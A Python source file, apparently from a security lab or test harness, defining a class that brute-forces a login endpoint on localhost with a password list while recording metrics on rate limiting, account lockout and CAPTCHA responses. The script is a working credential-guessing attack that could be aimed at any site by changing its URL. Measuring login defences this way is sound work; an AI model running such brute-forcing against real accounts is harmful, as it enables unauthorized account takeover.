import requests
import time
from .metrics import AttackMetrics

class BruteforceAttack:
    def __init__(self, base_url="http://127.0.0.1:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def attack(self, username, password_list, metrics: AttackMetrics, delay=0):
        """
        Bruteforce attack on a user with a password list
        
        Args:
            username: target username
            password_list: list of passwords to test
            metrics: AttackMetrics object for data collection
            delay: delay between each attempt (in seconds)
        """
        print(f"🔨 Starting Bruteforce on '{username}' with {len(password_list)} passwords...")
        
        metrics.start()
        found_password = None
        
        for i, password in enumerate(password_list, 1):
            start = time.time()
            
            try:
                response = self.session.post(
                    f"{self.base_url}/login",
                    json={"username": username, "password": password},
                    timeout=10
                )
                
                latency = int((time.time() - start) * 1000)
                
                # Check for success
                if response.status_code == 200:
                    data = response.json()
                    success = data.get("success", False)
                    
                    if success:
                        found_password = password
                        metrics.record_attempt(True, latency)
                        print(f"✅ PASSWORD FOUND: {password} (attempt #{i})")
                        break
                    else:
                        metrics.record_attempt(False, latency)
                else:
                    # Handle errors (rate limit, lockout, captcha)
                    metrics.record_attempt(False, latency)
                    
                    if response.status_code == 429:
                        print(f"⚠️  Rate limited at attempt #{i}")
                    elif response.status_code == 403:
                        data = response.json()
                        if "locked" in data.get("error", ""):
                            print(f"🔒 Account locked at attempt #{i}")
                        elif data.get("captcha_required"):
                            print(f"🤖 CAPTCHA required at attempt #{i}")
                
                # Sample resources every 10 attempts
                if i % 10 == 0:
                    metrics.sample_resources()
                    
                # Progress display
                if i % 100 == 0:
                    print(f"   ... {i}/{len(password_list)} attempts")
                
            except Exception as e:
                print(f"❌ Error: {e}")
                metrics.record_attempt(False, 0)
            
            # Delay between attempts
            if delay > 0:
                time.sleep(delay)
        
        metrics.stop()
        
        if not found_password:
            print(f"❌ Failed: password not found after {len(password_list)} attempts")
        
        return found_password

